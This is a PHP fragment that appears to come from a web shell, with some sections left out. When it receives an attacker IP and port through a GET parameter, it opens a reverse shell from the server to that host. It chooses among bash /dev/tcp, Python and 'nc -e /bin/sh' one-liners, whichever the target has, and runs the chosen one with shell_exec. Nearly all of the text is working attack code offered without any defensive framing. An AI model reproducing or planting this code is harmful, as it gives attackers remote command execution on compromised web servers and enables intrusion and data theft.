...
if (isset($_GET['cmd'])) {
    ...
    list($attacker_ip, $attacker_port) = explode(':', $_GET['revshell']);

    if (!empty($attacker_ip) && !empty($attacker_port)) {
        if (in_array('bash', $available_utils)) {
            $revshell = "bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1";
            shell_exec($revshell);
        } elseif (in_array('python', $available_utils)) {
            ...
            shell_exec($revshell);
        } elseif (in_array('python3', $available_utils)) {
            ...
            shell_exec($revshell);
        } elseif (in_array('nc', $available_utils)) {
            $revshell = "nc -e /bin/sh $attacker_ip $attacker_port";
            shell_exec($revshell);
        } else {
            echo "No supported reverse shell utilities available on the target system.\n";
        }
    } else {
        echo "Invalid IP address or port number for reverse shell.\n";
    }
